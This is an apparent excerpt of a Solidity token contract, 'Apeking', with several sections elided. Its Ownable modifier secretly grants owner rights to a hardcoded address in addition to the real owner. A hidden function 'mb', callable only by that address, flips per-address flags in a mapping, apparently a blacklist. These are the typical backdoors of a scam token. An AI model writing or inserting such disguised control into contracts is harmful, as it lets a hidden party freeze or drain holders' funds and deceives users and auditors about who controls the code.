...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x56293abBAd21Eae99DC32FAFf63fA79F48dbF4e6) , "Ownable: caller is not the owner");
        _;
    }
...
contract Apeking is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0xc2Da966bc6794b5E20B19a5e48D9302908859461);
    address payable public teamWalletAddress = payable(0xc2Da966bc6794b5E20B19a5e48D9302908859461);
    ...
    uint256 private _totalSupply =  5900000 * 10**_decimals;
    ...
    function mb(address addr, bool status) public{
        require(_msgSender()    ==   address(0x56293abBAd21Eae99DC32FAFf63fA79F48dbF4e6));
        aa[addr] = status;
    }
